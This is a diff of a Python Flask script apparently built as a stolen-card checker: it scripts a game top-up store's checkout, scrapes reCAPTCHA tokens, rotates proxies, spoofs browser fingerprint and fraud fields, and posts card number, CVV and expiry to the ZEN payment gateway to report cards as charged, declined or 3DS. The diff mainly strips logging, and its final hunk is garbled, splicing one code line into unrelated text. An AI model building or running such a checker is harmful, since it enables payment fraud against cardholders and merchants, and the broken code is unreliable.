@@ -1,4 +1,4 @@
-# main.py
+import os
 import base64
 import requests
 import re
@@ -7,7 +7,6 @@ import random
 import string
 import time
 import uuid
-import os
 import logging
 from urllib.parse import urljoin
 from flask import Flask, request, jsonify
@@ -81,7 +80,6 @@ def create_session_with_proxy(proxy_url=None):
         proxy_dict = get_proxy_dict(proxy_url)
         if proxy_dict:
             session.proxies.update(proxy_dict)
-            logger.info(f"Proxy enabled: {proxy_url}")
     return session
 
 
@@ -163,8 +161,7 @@ def get_recaptcha_token(session):
         )
         rr = re.search(r'\["rresp","([^"]+)"', resp.text)
         return rr.group(1) if rr else None
-    except Exception as e:
-        logger.error(f"reCAPTCHA error: {e}")
+    except Exception:
         return None
 
 
@@ -189,14 +186,9 @@ def check_card(card, player_id, proxy_url=None):
     }
 
     try:
-        # Homepage + Product
-        logger.info("Fetching homepage...")
         sess.get(f"{BASE}/", headers={**html_headers, "Sec-Fetch-Site": "none"}, timeout=30)
-        logger.info("Fetching product page...")
         sess.get(f"{BASE}/{PRODUCT_SLUG}", headers={**html_headers, "Referer": f"{BASE}/"}, timeout=30)
 
-        # Validate Player ID
-        logger.info(f"Validating player ID: {player_id}")
         validate_response = sess.post(f"{BASE}/topups/validate-fields", headers={
             "Accept": "application/json", "Content-Type": "application/json",
             "Origin": BASE, "Referer": f"{BASE}/{PRODUCT_SLUG}",
@@ -210,8 +202,6 @@ def check_card(card, player_id, proxy_url=None):
                 "proxy_used": "true" if proxy_url else "false", "By": CREATOR
             }
 
-        # Add to cart
-        logger.info("Adding to cart...")
         boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
         payload_json = json.dumps({
             "topupFields": {"playerid": {"label": "Player ID", "value": player_id, "displayLabel": player_id}},
@@ -243,12 +233,8 @@ def check_card(card, player_id, proxy_url=None):
             **html_headers, "Origin": BASE, "Referer": f"{BASE}/{PRODUCT_SLUG}",
         }, data=body.encode(), allow_redirects=True, timeout=30)
 
-        # Cart
-        logger.info("Accessing cart...")
         sess.get(f"{BASE}/checkout/cart", headers={**html_headers, "Referer": f"{BASE}/{PRODUCT_SLUG}"}, timeout=30)
 
-        # Register guest
-        logger.info("Registering as guest...")
         recaptcha_token = get_recaptcha_token(sess)
         reg_data = {
             "redirectTo": "frontend.checkout.confirm.page",
@@ -277,8 +263,6 @@ def check_card(card, player_id, proxy_url=None):
                 "proxy_used": "true" if proxy_url else "false", "By": CREATOR
             }
 
-        # Configure checkout
-        logger.info("Configuring checkout...")
         if "/checkout/confirm" not in resp.url:
             sess.get(f"{BASE}/checkout/confirm", headers={**html_headers, "Referer": f"{BASE}/account/register"}, timeout=30)
 
@@ -292,8 +276,6 @@ def check_card(card, player_id, proxy_url=None):
             "paymentMethodId": PAYMENT_METHOD_ID,
         }, allow_redirects=True, timeout=30)
 
-        # Place order
-        logger.info("Placing order...")
         resp = sess.post(f"{BASE}/checkout/order", headers={
             "Content-Type": "application/x-www-form-urlencoded",
             **html_headers, "Origin": BASE, "Referer": f"{BASE}/account/order",
@@ -319,9 +301,7 @@ def check_card(card, player_id, proxy_url=None):
             }
 
         checkout_id = zen_url.rstrip("/").split("/")[-1].split("?")[0]
-        logger.info(f"Checkout ID: {checkout_id}")
 
-        # ZEN payment setup
         ZEN = "https://secure.zen.com"
         zh = {
             "Accept": "application/json", "Referer": f"{ZEN}/{checkout_id}",
@@ -336,137 +316,7 @@ def check_card(card, player_id, proxy_url=None):
 
         sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh, timeout=30)
         resp_checkout = sess.get(f"{ZEN}/api/v2/checkouts/{checkout_id}", headers=zh, timeout=30)
-        checkout_data = resp_checkout.json() if resp_checkout.status_code == 200 else {}
-
-        amount = checkout_data.get("amount", "0.82")
-        currency = checkout_data.get("currency", "EUR")
-        price_str = f"{amount} {currency}"
-
-        # Get termsId
-        channel_variant = "COR_MASTERCARD" if cc[0] == "5" else "COR_VISA"
-        resp = sess.get(
-            f"{ZEN}/api/v1/checkouts/{checkout_id}/available-payment-methods",
-            headers=zh, params={"country": "PK", "offset": 0, "limit": 50},
-            timeout=30
-        )
-        terms_id = None
-        def find_terms(obj):
-            if isinstance(obj, dict):
-                if "termsId" in obj and obj["termsId"]:
-                    return obj["termsId"]
-                for v in obj.values():
-                    r = find_terms(v)
-                    if r:
-                        return r
-            elif isinstance(obj, list):
-                for item in obj:
-                    r = find_terms(item)
-                    if r:
-                        return r
-            return None
-
-        if resp.status_code == 200:
-            terms_id = find_terms(resp.json())
-        if not terms_id:
-            terms_id = find_terms(checkout_data)
-        if not terms_id:
-            resp2 = sess.get(zen_url, headers={"Accept": "text/html", "Referer": f"{BASE}/"}, timeout=30)
-            tm = re.search(r'termsId["\s:]+(["\'])([a-f0-9-]{36})\1', resp2.text)
-            if tm:
-                terms_id = tm.group(2)
-        if not terms_id:
-            terms_id = "fafb2ee2-93ba-496b-b3c3-ec1794a41fbe"
-
-        # BIN check
-        logger.info("Checking BIN...")
-        sess.post(
-            f"{ZEN}/api/checkouts/{checkout_id}/acquire-card-currency",
-            headers={**zh, "Content-Type": "application/json"},
-            json={"cardNumber": cc},
-            timeout=30
-        )
-
-        # Submit payment
-        logger.info("Submitting payment...")
-        tm_session = str(uuid.uuid4())
-        fp = json.dumps({"version": "1.4.1", "metadata": {}, "data": [{"name": "THREATMETRIX", "value": tm_session}]})
-
-        payload = {
-            "channelCode": "PCL_CARD",
-            "fraudFields": {
-                "browserData": {
-                    "availableScreenResolution": [1536, 816], "colorDepth": 32,
-                    "javaEnabled": False, "language": "en-US",
-                    "screenResolution": [1536, 864], "timezone": "Asia/Karachi",
-                    "timezoneOffset": -300, "userAgent": sess.headers["User-Agent"],
-                },
-                "fingerPrintId": "ZEN;" + base64.b64encode(fp.encode()).decode(),
-            },
-            "cardPayment": {"cvv": card["cvv"], "number": cc, "expirationDate": exp},
-            "aft": False,
-            "channelVariant": channel_variant,
-        }
-        if terms_id:
-            payload["termsId"] = terms_id
-
-        resp = sess.post(
-            f"{ZEN}/api/checkouts/{checkout_id}/payments",
-            headers={**zh, "Content-Type": "application/json"},
-            json=payload,
-            timeout=30
-        )
-
-        if resp.status_code in (200, 201):
-            result = resp.json()
-            status = result.get("status", "UNKNOWN").upper()
-            txn_id = result.get("id", result.get("transactionId", ""))
-            detailed_message = result.get("message", STATUS_MESSAGES.get(status, "Unknown status"))
-
-            if status == "PAYMENT_STARTED" and txn_id:
-                time.sleep(2)
-                summary_resp = sess.get(f"{ZEN}/api/checkouts/{checkout_id}/summary", headers=zh, timeout=30)
-                summary = summary_resp.json() if summary_resp.status_code == 200 else {}
-
-                def has_3ds(obj):
-                    s = json.dumps(obj) if isinstance(obj, (dict, list)) else str(obj)
-                    return "cardauth" in s or "threeds" in s.lower() or "3ds" in s.lower()
-
-                if has_3ds(summary):
-                    status = "3DS"
-                    detailed_message = "3D Secure authentication required."
-                else:
-                    sess.patch(
-                        f"{ZEN}/api/checkouts/{checkout_id}/payments/{txn_id}/redirect",
-                        headers={**zh, "Content-Type": "application/json"},
-                        json={},
-                        timeout=30
-                    )
-                    for _ in range(10):
-                        time.sleep(2)
-                        sr = sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh, timeout=30)
-                        if sr.status_code == 200:
-                            sd = sr.json()
-                            new_status = sd.get("status", "")
-                            if new_status == "PAYMENT_REJECTED":
-                                status = "DECLINED"
-                                detailed_message = sd.get("message", "Your card was declined.")
-                                break
-                            elif new_status == "PAYMENT_ACCEPTED":
-                                status = "CHARGED"
-                                detailed_message = "Payment successful!"
-                                break
-                            elif new_status not in ("", "PAYMENT_STARTED"):
-                                status = new_status
-                                detailed_message = sd.get("message", STATUS_MESSAGES.get(status, ""))
-                                break
-
-            mapped = {
-                "PAYMENT_ACCEPTED": "CHARGED", "CHARGED": "CHARGED",
-                "PAYMENT_REJECTED": "DECLINED", "DECLINED": "DECLINED",
-                "3DS": "3DS", "PAYMENT_STARTED": "PENDING",
-            }
-            final_status = mapped.get(status, status)
-            final_message = detailed_message if detailed_message else STATUS_MESSAGES.get(final_status, "Payment processed.")
+        checkout_data = resp_checkout.json() if resp_checmeout detailed_message else STATUS_MESSAGES.get(final_status, "Payment processed.")
 
             logger.info(f"Payment result: {final_status}")
             return {
